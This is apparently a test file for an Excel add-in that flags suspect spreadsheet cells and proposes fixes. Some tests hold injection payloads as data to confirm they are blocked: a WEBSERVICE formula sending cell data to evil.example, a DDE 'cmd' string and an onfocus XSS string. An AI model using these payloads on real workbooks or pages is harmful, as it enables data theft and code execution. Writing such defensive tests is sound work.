    "Flagged by 1 of 2: Share weird limit is 0.2; this is 0.04 (maybe 0.4)", 0, 0, {}, null, { Share: 0.4 });
  assert.deepEqual(wg.changes, [{ cell: "B3", new: "0.4" }]);
  assert.ok(wg.guess && wg.explanation.includes("Share is 0.04; it may be a typo for 0.4 (missing zeros, ÷10), but a real value can look the same"), wg.explanation);
  // a long-format blank judged inside its group says the group, not "the rest of the column", and writes nothing
  const lb = recommendFix(["Indicator", "Value"], [["GDP (bn)", 4], ["GDP (bn)", null]], 1, { Value: [1, 9, 0, 20] },
    "Blank cell in column Value, which is otherwise filled for Indicator GDP (bn)", 0, 0, {}, null, {});
  assert.deepEqual(lb.changes, []);
  assert.ok(lb.explanation.includes("Value is blank where the rest of Indicator GDP (bn) is filled"), lb.explanation);
  // no guess from the engine (a 12 among 0-5 children): nothing written
  assert.deepEqual(recommendFix(["Who", "Q3"], [["a", 4], ["b", 12]], 1, { Q3: [0, 5, 0, 9] }, "Q3 baseline limit is 9; this is 12", 0, 0, {}, null, {}).changes, []);
}
// a misspelling's fix is offered, labelled a guess
const mr = recommendFix(["Item"], [["Pencl"], ["Pencil"]], 0, {}, 'Item "Pencl" looks like a misspelling of "Pencil"', 0, 0, {}, null, { Item: "Pencil" });
assert.deepEqual(mr.changes, [{ cell: "A2", new: "Pencil" }]);
assert.ok(mr.guess && mr.explanation.includes("misspelling"));
// AH-160: a spelling the engine offers that Excel would read as a formula (a full-width ＝ is =) is never written
{ const evil = '＝WEBSERVICE("https://evil.example/?"&A2)';
  assert.deepEqual(recommendFix(["Item"], [["＝webservice(1)"]], 0, {}, "x", 0, 0, { Item: evil }).changes, []);
  assert.deepEqual(recommendFix(["Item"], [["Pencl"]], 0, {}, "x", 0, 0, {}, null, { Item: "@SUM(A1)" }).changes, []);
  assert.deepEqual(recommendFix(["Item"], [["east"]], 0, {}, "x", 0, 0, { Item: "East" }).changes, [{ cell: "A2", new: "East" }]);
  assert.deepEqual(recommendFix(["Item"], [["-5 kg"]], 0, {}, "x", 0, 0, { Item: "-5" }).changes, [{ cell: "A2", new: "-5" }]); }

// auto-fix: only the engine's exact fixes, on known columns; text must match exactly for Undo
// undo auto-fixes never types a formula or writes off-grid, whatever the workbook's stored undo says (2026-10-15
// audit: a crafted .xlsx could carry its own undo record); real auto-fix records hold only plain text
assert.deepEqual(safeUndo([{ cell: "B3", old: "east " }, { cell: "Z1", old: '=WEBSERVICE("https://x/?"&A2)' },
  { cell: "B4", old: "＝1+1" }, { cell: "B5", old: "@SUM(1)" }, { cell: "B6", old: "+cmd|'/c calc'!A0" },
  { cell: "B7", old: -5 }, { cell: "B8", old: "-5" }, { cell: "Sheet2!A1", old: "x" }, { cell: "B9", old: null },
  { cell: "B10", old: "-west" }, { cell: "B11", old: ['=WEBSERVICE("https://x/?"&A2)'] }, { cell: "B12", old: { a: 1 } },
  { cell: "B13", old: true }, { cell: "B14", old: Infinity }]).map((w) => w.cell), ["B3", "B7", "B8", "B13"]);
assert.deepEqual(exactFixes([{ exact: { Region: "East" } }, null, { severity: "Low", likely: { Units: 5 } }, { exact: { Nope: "x" } }], ["Date", "Region"]),
  [{ k: 0, j: 1, value: "East" }]);
// AH-160: an exact fix the engine gives that Excel would read as a formula is never auto-written (a full-width ＝ is =)
assert.deepEqual(exactFixes([{ exact: { Region: '＝WEBSERVICE("https://evil.example/?"&A2)' } }, { exact: { Region: "+cmd" } },
  { exact: { Region: "-5" } }], ["Date", "Region"]), [{ k: 2, j: 1, value: "-5" }]);

// instant recommendation: data A1:C5, header row 1, limits on Units only
const cols = ["Date", "Region", "Units"];
const data = [["2026-01-06", "East", 40], ["2026-01-07", "West", -5], ["2026-01-08", "East", ""], ["2026-01-09", "East", 41]];
const lim = { Units: [10, 80, 0, 120] };
let rec = recommendFix(cols, data, 1, lim, "Flagged by 2 of 4: Units weird limit is 0; this is -5", 0, 0);
// no typo behind it: nothing is invented - a median card overwrote 169 delegates with 39 on a real sheet (2026-10-16)
assert.deepEqual(rec.changes, [], "past a limit with no known value: advice only, never a median");
assert.ok(rec.explanation.startsWith("Units is -5, past its limit of 0. Check it against the source; if it's right, leave it."), rec.explanation);
assert.equal(rec.guess, false);
assert.equal(recommendFix(cols, data, 1, lim, "Units weird limit is 0; this is -5 (likely 5)", 0, 0, { Units: 5 }).guess, false, "an obvious typo (-5 for 5) is not a guess");
// a value past the limits that the engine did NOT flag (a regular repeated toll; the row is flagged as a duplicate) stays
assert.deepEqual(recommendFix(cols, data, 1, lim, "Flagged by 1 of 3: Duplicate of row 2", 0, 0).changes, [], "only columns the engine flagged");
// AH-152: a Total whose own formula is one row off, or typed over: the card writes the column's own formula (known, sent
// by the engine as R1C1), shown as Excel shows it for that row, ahead of the "does not add up" number
{ const odd = recommendFix(["Qty", "Price", "Total"], [[2, 5, 10], [3, 6, 21]], 1, { Total: [0, 50, 0, 90] },
    "Total 21 does not add up: Qty × Price = 18; Total uses a different formula from the other rows of its column", 0, 0,
    { Total: 18 }, [null, null, "=RC[-2]*R[1]C[-1]"], {}, { Total: "=RC[-2]*RC[-1]" });
  assert.deepEqual(odd.changes, [{ cell: "C3", new: "=A3*B3", r1c1: "=RC[-2]*RC[-1]" }], JSON.stringify(odd.changes));
  assert.ok(!odd.explanation.includes("Fix the cells it uses") && !odd.explanation.includes("one of these numbers is wrong")
    && odd.explanation.includes("Accept puts the column's own formula in its place"), odd.explanation);
  const typed = recommendFix(["Qty", "Price", "Total"], [[2, 5, 10], [3, 6, 250]], 1, {},
    "Total 250 does not add up: Qty × Price = 18; Total 250 is a typed number where the column's other rows use a formula", 0, 0,
    { Total: 18 }, [null, null, 250], {}, { Total: "=RC[-2]*RC[-1]" });
  assert.deepEqual(typed.changes, [{ cell: "C3", new: "=A3*B3", r1c1: "=RC[-2]*RC[-1]" }], "the formula, never the worked-out 18");
  assert.ok(typed.explanation.includes("Accept puts the column's formula back"), typed.explanation);
  assert.equal(r1c1ToA1("=SUM(R2C1:R[-1]C)+RC[-27]*R[1]C[1]+ROUND(RC[1],2)", 10, 27), "=SUM($A$2:AB9)+A10*AC11+ROUND(AC10,2)"); }
rec = recommendFix(cols, data, 0, lim, "x", 0, 0);
assert.deepEqual(rec.changes, [], "inside limits: no change");
assert.ok(rec.explanation.includes("Nothing here is clearly broken"));
rec = recommendFix(cols, data, 2, lim, "Flagged by 0 of 4: Blank cell in column Units, which is otherwise filled", 0, 0);
assert.deepEqual(rec.changes, [], "a blank gets no invented value (17,000 blanks-on-purpose were median-filled on one real sheet)");
assert.ok(rec.explanation.includes("Units is blank where the rest of the column is filled. Fill it in from the source."), rec.explanation);
assert.deepEqual(recommendFix(cols, data, 3, lim, "x", 0, 0).changes, [], "a blank elsewhere isn't touched");
rec = recommendFix(cols, data, 1, lim, "Units weird limit is 0; this is -5 (likely 5)", 4, 2, { Units: 5 }); // data starts at C5
assert.deepEqual(rec.changes, [{ cell: "E7", new: "5" }], "offset data: the fix lands in the sheet's own cell");
rec = recommendFix(cols, data, 0, null, 'Flagged by 1 of 4: Duplicate of row 2', 4, 0); // header in row 5
assert.ok(rec.explanation.includes("repeats row 6"), "duplicate row number shifts with the data: " + rec.explanation);
rec = recommendFix(cols, data, 0, null, 'Flagged by 1 of 4: Duplicate of row 2; Text "12O" in number column Units', 0, 0);
assert.ok(rec.explanation.includes("repeats row 2") && rec.explanation.includes('Units holds the text "12O"'), rec.explanation);
assert.deepEqual(recommendFix(cols, [["a", "b", 999]], 0, lim, "Units weird limit is 120; this is 999", 0, 0).changes, [], "no typo behind it: nothing written");
// the row's own arithmetic gives the value (the engine solved Total ÷ UnitCost): that is the fix, and the card says why
const ac = ["Units", "UnitCost", "Total"], ad = [[57, 2.99, 170.43], [-5, 2.99, 170.43], [49, 2.99, 146.51]];
rec = recommendFix(ac, ad, 1, { Units: [30, 70, 0, 100] }, "Units weird limit is 0; this is -5; Total 170.43 does not add up: Units × UnitCost = -14.95", 0, 0, { Units: 57 });
assert.deepEqual(rec.changes, [{ cell: "A3", new: "57" }]);
assert.ok(rec.explanation.startsWith("Units is -5, but the row's own numbers say 57 (Total 170.43 = Units × UnitCost)"), rec.explanation);
assert.equal(rec.guess, false, "arithmetic is not a guess");
// a sign flip the engine kept over a value worked out from a rounded rate: a typo card, never "the row's own numbers say"
rec = recommendFix(["Clicks", "Spend", "CPC"], [[3810, -3314.28, 0.87]], 0, { Spend: [100, 9000, 0, 20000] },
  "Spend -3314.28 does not add up: Clicks × CPC = 3314.7; Spend weird limit is 0; this is -3314.28 (likely 3314.28)", 0, 0, { Spend: 3314.28 });
assert.deepEqual(rec.changes, [{ cell: "B2", new: "3314.28" }]);
assert.ok(rec.explanation.startsWith("Spend is -3314.28, which looks like a typo for 3314.28 (sign flipped)") &&
  !rec.explanation.includes("own numbers") && !rec.explanation.includes("one of these numbers is wrong"), rec.explanation);
// a total that doesn't add up, no single cell out of range: say which numbers disagree, never "nothing is broken"
rec = recommendFix(ac, ad, 0, { Units: [30, 70, 0, 100] }, "Total 200 does not add up: Units × UnitCost = 170.43", 0, 0);
assert.deepEqual(rec.changes, []);
assert.ok(rec.explanation.startsWith("Total 200 does not add up: Units × UnitCost = 170.43, so one of these numbers is wrong") &&
  !rec.explanation.includes("Nothing here"), rec.explanation);

// header below title rows; numeric year headers kept; dates converted using the first DATA row's format
let tg = tableFromGrid([["Cost Report"], ["Period 9"], [""], ["Code", "Item", "Budget"], ["03-1", "Pour", 500], ["03-2", "Form", 700]],
  null, 0, 0);
assert.deepEqual([tg.columns, tg.startRow, tg.rows.length], [["Code", "Item", "Budget"], 3, 2]);
tg = tableFromGrid([["($mm)", 2024, 2025], ["Revenue", 10, 12]], null, 4, 2);
assert.deepEqual([tg.columns, tg.startRow, tg.startCol], [["($mm)", 2024, 2025], 4, 2], "a year header is still the header");
tg = tableFromGrid([["Date", "Units"], [46028, 5]], [["General", "General"], ["m/d/yyyy", "0"]], 0, 0);
assert.deepEqual(tg.rows, [["2026-01-06", 5]]);
assert.equal(tableFromGrid([["Title only"]], null, 0, 0), null);
assert.equal(tableFromGrid([["A", "B"]], null, 0, 0), null, "header with no data");

// engine-spotted typo becomes the fix; wide columns are never median-overwritten
assert.equal(typoKind(2600, 26), "extra zeros, x100");
assert.equal(typoKind(0.26, 26), "missing zeros, ÷100");
assert.equal(typoKind(-26, 26), "sign flipped");
rec = recommendFix(cols, data, 1, lim, "Units weird limit is 0; this is -5 (likely 5)", 0, 0, { Units: 5 });
assert.deepEqual(rec.changes, [{ cell: "C3", new: "5" }]);
assert.ok(rec.explanation.startsWith("Units is -5, which looks like a typo for 5 (sign flipped)"), rec.explanation);
const wide = [["a", 100], ["b", 900], ["c", 15000], ["d", 2200], ["e", 400], ["f", 7000], ["g", 30000], ["h", 1300], ["i", 600], ["j", 5000], ["k", 999999]];
rec = recommendFix(["Id", "Paid"], wide, 10, { Paid: [0, 20000, 0, 40000] }, "Paid weird limit is 40000; this is 999999", 0, 0);
assert.deepEqual(rec.changes, [], "a huge value in a naturally wide column is not overwritten");
assert.ok(rec.explanation.includes("if it's right, leave it"), rec.explanation);
assert.equal(typoKind(-0.0201808419078588, 0.02018084191), "sign flipped", "a rounded fix still reads as a sign flip, not zeros");
// one slip changes one cell: three columns off by the same x1000 is a real row (California's fruit added up exactly)
const fr = ["Fresh", "Processed", "Total"], frd = [[2.1, 4.5, 6.6], [2791.8, 5944.6, 8736.4], [1.9, 3.2, 5.1]];
rec = recommendFix(fr, frd, 1, { Fresh: [0, 5, 0, 10], Processed: [0, 9, 0, 20], Total: [0, 12, 0, 30] },
  "Fresh weird limit is 10; this is 2791.8 (likely 2.7918); Processed weird limit is 20; this is 5944.6 (likely 5.9446); " +
  "Total weird limit is 30; this is 8736.4 (likely 8.7364)", 0, 0, { Fresh: 2.7918, Processed: 5.9446, Total: 8.7364 });
assert.deepEqual(rec.changes, [], "the same step in 3 cells is not 3 typos");
assert.ok(rec.explanation.includes("probably real or entered in other units"), rec.explanation);
// worth-a-check reasons say what to look for, never "Nothing here is clearly broken"
rec = recommendFix(["Id", "When"], [["a", "2084-03-01"]], 0, null, "When 2084-03-01 is far outside the column's dates (2018-01-02 to 2019-12-30)", 0, 0);
assert.ok(rec.explanation.includes("mistyped year") && !rec.explanation.includes("Nothing here"), rec.explanation);
// AH-178: a year column's far year, and a column above the one it is at most on every other row: said, nothing written
rec = recommendFix(["Id", "year"], [["a", 2084]], 0, null, "year 2084 is far outside the column's years (1981 to 2022)", 0, 0);
assert.ok(rec.explanation.includes("mistyped year") && !rec.explanation.includes("Nothing here") && !rec.changes.length, rec.explanation);
rec = recommendFix(["Id", "p10", "p90"], [["a", 30.1, 14.1]], 0, null, "p10 30.1 is above p90 14.1, where p10 is at most p90 on 1199 of 1200 rows", 0, 0);
assert.ok(rec.explanation.includes("check both cells") && !rec.explanation.includes("Nothing here") && !rec.changes.length, rec.explanation);
// AH-182: a column pasted twice and a gene name turned into a date say what to look for, and write nothing
rec = recommendFix(["Id", "Series 2", "Series 3"], [["a", 5.2, 5.2]], 0, null, "Series 3 is the same 1,200 numbers as Series 2, row for row: was one column pasted twice?", 0, 0);
assert.ok(rec.explanation.includes("one series pasted") && !rec.explanation.includes("Nothing here") && !rec.changes.length, rec.explanation);
for (const reason of ['Gene "2-Sep" is a date among gene names: Excel turns names such as SEPT2 or MARCH1 into dates when they are typed or opened from a CSV',
  "Gene 38962 is the date 2006-09-02 as Excel stores it, a date among gene names: Excel turns names such as SEPT2 or MARCH1 into dates when they are typed or opened from a CSV"]) {
  rec = recommendFix(["Id", "Gene"], [["a", "2-Sep"]], 0, null, reason, 0, 0);
  assert.ok(rec.explanation.includes("format the column as Text") && !rec.explanation.includes("Nothing here") && !rec.changes.length, rec.explanation);
}
rec = recommendFix(["Id", "Day"], [["a", 7.3]], 0, null, "Day 7.3 is not a whole number - every other Day is", 0, 0);
assert.ok(rec.explanation.includes("check the decimal point"), rec.explanation);
// AH-55: a name's bound and a share over 100 say what to look for, and write nothing
rec = recommendFix(["Id", "Birth month"], [["a", 13]], 0, null, "Birth month 13 is outside what Birth month can be (1 to 12)", 0, 0);
assert.ok(rec.explanation.includes("a typing slip is the usual cause") && !rec.explanation.includes("Nothing here") && !rec.changes.length, rec.explanation);
rec = recommendFix(["Id", "Percent"], [["a", 200]], 0, null, "Percent 200 is over 100, and every other Percent is a share between 0 and 100", 0, 0);
assert.ok(rec.explanation.includes("a share of a whole over 100") && !rec.explanation.includes("Nothing here") && !rec.changes.length, rec.explanation);
// AH-56: an unfinished record, a skipped survey question and many layout blanks say what they are, and write nothing
for (const [reason, says] of [["7 of the 9 usually filled cells in this row are blank: an unfinished record (in a survey, a respondent who stopped answering)", "never entered"],
  ["Do you ever gamble? is unanswered in 13 of 550 rows: a survey question a respondent may skip", "chose to skip"],
  ["director is blank in 163 of 8807 rows where type would fill it, spread through the sheet", "the source does not have"]]) {
  rec = recommendFix(["Id", "Q"], [["a", ""]], 0, {}, reason, 0, 0);
  assert.ok(rec.explanation.includes(says) && !rec.explanation.includes("Nothing here") && !rec.changes.length, rec.explanation);
}
// AH-62: a column's own code for no value says what it means, and nothing is written over it
rec = recommendFix(["Id", "t_hh"], [["a", -9999]], 0, { t_hh: [60, 115, 50, 125] }, "t_hh -9999 is written 1375 times: the column's code for no value", 0, 0);
assert.ok(rec.explanation.includes('-9999 is how this sheet writes "no value"') && !rec.explanation.includes("Nothing here") && !rec.changes.length, rec.explanation);
// a lone top value (AH-29) is told what it is, never "just unusual together", and nothing is written
rec = recommendFix(["Id", "Fee"], [["a", 106500]], 0, { Fee: [5, 500000, 5, 22970000] }, "Fee 106500 stands alone above the rest of the column, whose next highest is 59985", 0, 0);
assert.ok(rec.explanation.includes("an extra zero or a slipped decimal point") && !rec.explanation.includes("unusual together") && !rec.changes.length, rec.explanation);
// a value its row's own arithmetic confirms (AH-74): said why it is probably real, nothing written over it
rec = recommendFix(["Id", "AnnualSalary", "Bonus", "TotalComp"], [["a", 1150000, 400000, 1550000]], 0,
  { Bonus: [1500, 9000, 1500, 22000] }, "Bonus 400000 is above its usual limit of 22000, but the row adds up (TotalComp = AnnualSalary + Bonus): worth a check", 0, 0, {}, null, {});
assert.ok(rec.explanation.includes("the row's own numbers agree") && !rec.explanation.includes("Nothing here") && !rec.changes.length, rec.explanation);
// many blanks spread through a column are one note (AH-28): what they usually are, never a value written in
rec = recommendFix(["Id", "Age"], [["a", ""]], 0, {}, "Age is blank in 178 of 891 rows, spread through the sheet", 0, 0);
assert.ok(rec.explanation.includes("not known") && !rec.explanation.includes("Nothing here") && !rec.changes.length, rec.explanation);
rec = recommendFix(["Id", "Age"], [["a", "NA"]], 0, {}, 'Age is "NA" (no value) in 178 of 891 rows', 0, 0);
assert.ok(rec.explanation.includes("not known") && !rec.changes.length, rec.explanation);
// AH-45 review: those cells hold the word, so the card says to filter for it, never "for blanks" (it found none)
assert.ok(rec.explanation.includes('filter it for "NA"') && !rec.explanation.includes("blanks"), rec.explanation);
rec = recommendFix(["Patient", "Smoking status"], [["a", "Unknown"]], 0, {}, 'Smoking status is "Unknown" (no value) in 300 of 20000 rows', 0, 0);
assert.ok(rec.explanation.includes('filter it for "Unknown" and fill those in') && !rec.explanation.includes("blanks") && !rec.changes.length, rec.explanation);
rec = recommendFix(["Id", "Age"], [["a", ""]], 0, {}, "Age is blank in 178 of 891 rows, spread through the sheet", 0, 0);
assert.ok(rec.explanation.includes("filter it for blanks"), rec.explanation);
// a guess says what kind of guess: a short form is not "a misspelling, one letter off"
rec = recommendFix(["Id", "Plan"], [["a", "Std"]], 0, null, 'Plan "Std" looks like a short form of "Standard"', 0, 0, null, null, { Plan: "Standard" });
assert.deepEqual(rec.changes, [{ cell: "B2", new: "Standard" }]);
assert.ok(rec.explanation.startsWith('Plan says "Std", probably a short form of "Standard"'), rec.explanation);
// a lone x10 slip the engine flags past the USUAL limit (inside a skewed column's wide weird one): its typo fix
// stands - the pane checked only the weird limit, so Balance 169946 for 16994.65 got "may be real", no fix (2026-10-15)
rec = recommendFix(["Id", "Paid"], wide, 10, { Paid: [0, 20000, 0, 2000000] }, "Paid weird limit is 20000; this is 999999 (likely 99999.9)", 0, 0, { Paid: 99999.9 });
assert.deepEqual(rec.changes, [{ cell: "B12", new: "99999.9" }], "the engine's typo fix past the usual limit is offered");

// a formula cell is never overwritten: its inputs are what's wrong
rec = recommendFix(cols, data, 1, lim, "Units weird limit is 0; this is -5 (likely 5)", 0, 0, { Units: 5 }, ["", "", "=A3*2"]);
assert.deepEqual(rec.changes, [], "no write into a formula cell");
assert.ok(rec.explanation.startsWith("C3 is calculated by a formula"), rec.explanation);
assert.ok(!rec.explanation.includes("Replace") && !rec.explanation.includes("typo for"), "no contradicting advice");
assert.deepEqual(tableFromGrid([["A", "B"], [1, 2]], null, 0, 0, [["A", "B"], [1, "=A2*2"]]).calc, [[1, "=A2*2"]]);
// spelling variant -> the usual spelling
rec = recommendFix(["Dept", "Hours"], [["sales", 40]], 0, {}, "x", 0, 0, { Dept: "Sales" });
assert.deepEqual(rec.changes, [{ cell: "A2", new: "Sales" }]);

// one-column sheet still has a header; duplicate headers use the engine's names ("Dept", "Dept.1")
assert.deepEqual(tableFromGrid([["Sq Ft"], [1900], [2100]], null, 0, 0).columns, ["Sq Ft"]);
assert.deepEqual(tableFromGrid([["Dept", "Dept", "Dept"], ["a", "b", "c"]], null, 0, 0).columns, ["Dept", "Dept.1", "Dept.2"]);
rec = recommendFix(["Dept", "Dept.1"], [["sales", "ops"]], 0, {}, "x", 0, 0, { Dept: "Sales" });
assert.deepEqual(rec.changes, [{ cell: "A2", new: "Sales" }], "fix only the column the engine named");

// a repeated header is named the way the sheet names it: its own header and its column letter, never the engine's
// "Units.1" (AH-128). Every other column, and a value in quotes, stays as written
tg = tableFromGrid([["Item", "Units", "Units sold", "Units"], ["a", 1, 2, 3]], null, 0, 1);
assert.deepEqual(tg.columns, ["Item", "Units", "Units sold", "Units.1"]);
assert.equal(plainReason('Flagged by 1 of 2: Units.1 weird limit is 50; this is 900 (likely 90); Units sold 5 does not add up: Units + Units.1 = 4; Item "Units" looks like a misspelling of "Unit"', tg.names),
  'Units (column E) is 900, above its usual limit of 50 (likely 90)\nUnits sold 5 does not add up: Units (column C) + Units (column E) = 4\nItem "Units" looks like a misspelling of "Unit"');
assert.equal(plainReason("Blank cell in column Units.1, which is otherwise filled", tg.names), "Blank cell in column Units (column E), which is otherwise filled");
assert.deepEqual(tableFromGrid([["A", "B"], [1, 2]], null, 0, 0).names, {}, "no repeated header: nothing renamed");

// L2: flagged rows worst first, clean rows out, data-row index kept
assert.deepEqual(flaggedRows([{ severity: null, magnitude: 0 }, { severity: "Low", magnitude: 2 }, { severity: "High", magnitude: 9 }]).map((r) => r.i), [2, 1]);

// reasons in plain words: no "weird limit", no vote count, a limit clause stays whole
assert.equal(plainReason("Flagged by 2 of 3: Units weird limit is 0; this is -5"), "Units is -5, below its usual limit of 0");
assert.equal(plainReason("fare amount weird limit is 35; this is 52 (likely 5.2); Duplicate of row 7"),
  "fare amount is 52, above its usual limit of 35 (likely 5.2)\nDuplicate of row 7");
// AH-149: each reason on its own line in the list and on the card; inside a sentence, a semicolon
assert.equal(plainReason("A is 1; B is 2", {}, "; "), "A is 1; B is 2");
assert.equal(plainReason("Flagged by 1 of 3: Unusual combination of values, mainly tolls; Units is unusual relative to its local trend near 2026-01-26 00:00:00"),
  "Unusual mix of values, mostly in tolls\nUnits breaks its usual pattern near 2026-01-26");
assert.equal(plainReason(""), "");
assert.equal(esc('x" autofocus onfocus="alert(1)'), "x&quot; autofocus onfocus=&quot;alert(1)", "a sheet header can't break out of an attribute");
assert.equal(esc("<b>'&"), "&lt;b&gt;&#39;&amp;");
assert.equal(plainReason("Flagged by 3 of 3: Units weird limit is 105; this is 9999; Units jumped sharply near 2026-01-26 00:00:00"),
  "Units is 9999, above its usual limit of 105\nUnits jumped sharply near 2026-01-26", "the ; after the value is a separator, not part of it");
assert.deepEqual(issuesOf("Flagged by 1 of 3: Units weird limit is 105; this is 9999 (likely 99.99); Duplicate of row 7").map((x) => x.text),
  ["Units weird limit is 105; this is 9999 (likely 99.99)", "Duplicate of row 7"], "limit clause kept whole");
assert.deepEqual(issuesOf(""), []);
assert.deepEqual(flaggedRows([{ severity: "Noted", magnitude: 5 }, { severity: "Low", magnitude: 2 }]).map((r) => r.i), [1], "Noted rows aren't listed");

// Batch 1: header names never collide (same rule as the engine); the limits editor only shows numbers
assert.deepEqual(tableFromGrid([["Dept", "Dept", "Dept.1"], ["a", "b", "c"]], null, 0, 0).columns, ["Dept", "Dept.1", "Dept.1.1"]);
assert.deepEqual(tableFromGrid([["Name", "Name", "Name"], ["a", "b", "c"]], null, 0, 0).columns, ["Name", "Name.1", "Name.2"]);
assert.deepEqual([asNumber(5), asNumber("2.5"), asNumber(null), asNumber(""), asNumber('1" onfocus="alert(1)'), asNumber(Infinity), asNumber(undefined)], [5, 2.5, "", "", "", "", ""]);

assert.equal(cutNote([250001, 1048576]), "Too large to scan at once: checked down to row 250,001 of 1,048,576. Rows below 250,001 were not checked.");

// Batch 3: text cells are never overwritten; placeholders and text get a plain-English note
const ph = recommendFix(["Pay", "Amt"], [["ERROR", 5], ["Card", 6]], 0, {}, 'Placeholder "ERROR" in column Pay', 0, 0, null, null);
assert.ok(ph.explanation.includes('Pay says "ERROR": a value of the column\'s own (a status, a log level) or a stand-in for a missing one') && !ph.changes.length);
const tx = recommendFix(["When"], [["UNKNOWN"]], 0, {}, 'Text "UNKNOWN" in date column When', 0, 0, null, null);
assert.ok(tx.explanation.includes("where a date belongs. Retype it as a date"));
// AH-75: a code that lost its leading zeros is explained, never padded (a card never writes into an ID column)
const lz = recommendFix(["PostalCode"], [["2134"], ["02134"]], 0, {}, 'PostalCode "2134" is 4 digits where the column writes 5: did it lose its leading zero?', 0, 0, null, null);
assert.ok(!lz.changes.length && lz.explanation.includes("format the column as Text and retype the code"), lz.explanation);
// AH-76: a date in another form, and a serial in a date column, are explained, never retyped for the user
const df = recommendFix(["HireDate"], [["31/12/2023"]], 0, {}, 'HireDate "31/12/2023" is written day-first where the column writes YYYY-MM-DD (read as 2023-12-31)', 0, 0, null, null);
assert.ok(!df.changes.length && df.explanation.includes("check which day it is against the source"), df.explanation);
const sr = recommendFix(["HireDate"], [[45292]], 0, {}, "HireDate 45292 is a number in a column of dates (an Excel date serial for 2024-01-01?)", 0, 0, null, null);
assert.ok(!sr.changes.length && sr.explanation.includes("if 2024-01-01 is the right day, format the cell as a date"), sr.explanation);
const money = recommendFix(["Price"], [["$1,000,000.00"], ["$1,200.00"]], 0, { Price: [900, 1500, 500, 2000] },
  "Flagged by 1 of 3: Price weird limit is 2000; this is 1000000", 0, 0, null, null);
assert.ok(!money.changes.length && money.explanation.startsWith("Price is 1000000, past its limit of 2000."), money.explanation);

// Final re-attack: a crafted reason can't freeze the pane
const evil = "Flagged by 1 of 3: " + " weird limit is a".repeat(2000) + "; this is 5";
let t0 = Date.now();
recommendFix(["Amt"], [[evil]], 0, {}, evil, 0, 0, null, null);
assert.ok(Date.now() - t0 < 500, `recommendFix took ${Date.now() - t0}ms on a crafted reason`);

const both = recommendFix(["Amt", "Price"], [["$1,000,000.00", 1000], ["$1,200.00", 10]], 0, { Price: [5, 20, 0, 50] },
  "Flagged by 2 of 3: Amt weird limit is 2000; this is 1000000; Price weird limit is 50; this is 1000", 0, 0, null, null);
assert.ok(both.explanation.includes("Amt is 1000000, past its limit of 2000") && both.explanation.includes("Price is 1000, past its limit of 50") &&
  both.changes.length === 0 && !both.explanation.includes("null"), both.explanation); // no typo behind either: advice for both, nothing written
const note = recommendFix(["Name", "Notes"], [["a", ""], ["b", "x"]], 0, {}, "Blank cell in column Notes, which is otherwise filled", 0, 0, null, null);
assert.ok(note.explanation.startsWith("Notes is blank where the rest of the column is filled"), note.explanation);

// AH-40: only the cells a row's reasons name are coloured; an engine that names none colours the row
assert.deepEqual(spots({ cells: ["Units", "Total"] }, ["Date", "Region", "Units", "Total"]), [2, 3]);
assert.deepEqual(spots({ cells: ["Gone"] }, ["A", "B"]), [0, 1], "a name the table no longer has: the whole row");
assert.deepEqual(spots({}, ["A", "B"]), [0, 1]);
// our colors are never Excel's own Bad / Neutral / Note fills, so a reopened pane never clears a cell the user styled
assert.ok(Object.values(COLOR).every((c) => !OLD_COLOR.includes(c)) && OLD_COLOR.length === 3);
// AH-150: the fills kept under highlights come from the workbook, which a crafted .xlsx can fill with anything: only A1
// cells and #RRGGBB fills (or none) go back into a cell, at most KEPT of them
assert.deepEqual({ ...asHighlights({ sheet: "S", cells: { C11: "#00B050", D2: null, "A1:B2": "#000000", E3: "red", F4: 1, Sheet2: "#000000" } }).cells }, { C11: "#00B050", D2: null });
for (const v of [null, "x", [], { sheet: 1, cells: {} }, { sheet: "S" }]) assert.equal(asHighlights(v), null);
assert.equal(Object.keys(asHighlights({ sheet: "S", cells: Object.fromEntries(Array.from({ length: KEPT + 5 }, (_, k) => [`A${k + 1}`, null])) }).cells).length, KEPT);
// AH-48: the note for many repeated rows gets its own advice, never "the values are just unusual together"
assert.match(recommendFix(["hotel", "adr"], [["City", 90]], 0, {}, "600 of 3000 rows repeat an earlier row exactly, all through the sheet - the first is this one, a copy of row 5", 0, 0).explanation,
  /^600 of 3000 rows repeat an earlier row exactly, all through the sheet - the first is this one, a copy of row 5: this many, spread out, are usually separate real records/);
// AH-49: amounts compared across groups are named like the other checks, and sorted by their relative width
assert.equal(fairnessNote({ protected: { Sex: "demographic" }, tests: [even("flag"), even("amount")] }),
  `${FAIR}Sex to pick which rows look wrong. Flagged rows and amounts come out about the same in each group.`);
assert.deepEqual(fairnessTests({ tests: [{ verdict: "even", measure: "amount", groups: { a: [50, 50000], b: [50, 49000] } },
  { verdict: "even", measure: "outcome", groups: { a: [50, 0.2], b: [50, 0.4] } }] }).map((t) => t.measure), ["outcome", "amount"]);
// AH-32: a rare ERROR may be a log level; its card never calls it only a stand-in
assert.match(recommendFix(["Time", "Level"], [["x", "ERROR"]], 0, {}, 'Placeholder "ERROR" in column Level', 0, 0).explanation, /a value of the column's own \(a status, a log level\) or a stand-in/);
assert.match(recommendFix(["Id", "Stage"], [["x", "TBD"]], 0, {}, 'Placeholder "TBD" in column Stage', 0, 0).explanation, /^Stage says "TBD", a stand-in for a missing value/);
// AH-46: the note for a sorted table's blank tail gets its own advice, never "the values are just unusual together"
assert.match(recommendFix(["Name", "APPEARANCES"], [["Hulk", ""]], 0, {}, "APPEARANCES is blank in 130 of 2000 rows, all at the end of the table, which is sorted by APPEARANCES", 0, 0).explanation,
  /^APPEARANCES is blank in 130 of 2000 rows, all at the end of the table, which is sorted by APPEARANCES: sorting puts blank cells last/);
// AH-94: the scan skeleton is one still block in the page, never built per scan (e2e counts nodes over 30 scans), and
// its rows are made of the very classes a list row is (components/row-item.js), so each bar sits where text lands
const html = readFileSync(new URL("taskpane.html", import.meta.url), "utf8");
const skel = /<section id="scan-skeleton" aria-hidden="true">([\s\S]*?)<\/section>/.exec(html)?.[1] || "";
const skRows = skel.split('<div class="row-box">').slice(1);
assert.equal(skRows.length, 5, "the scan skeleton has 5 list rows");
const rowClasses = [...readFileSync(new URL("components/row-item.js", import.meta.url), "utf8").matchAll(/class="([a-z-]+)"/g)].map((m) => m[1]);
assert.deepEqual([...new Set(rowClasses)].sort(), ["row-head", "row-why", "sev", "swatch"]);
for (const r of skRows) for (const c of rowClasses) assert.ok(r.includes(`class="${c}"`), `a skeleton row lacks .${c}`);
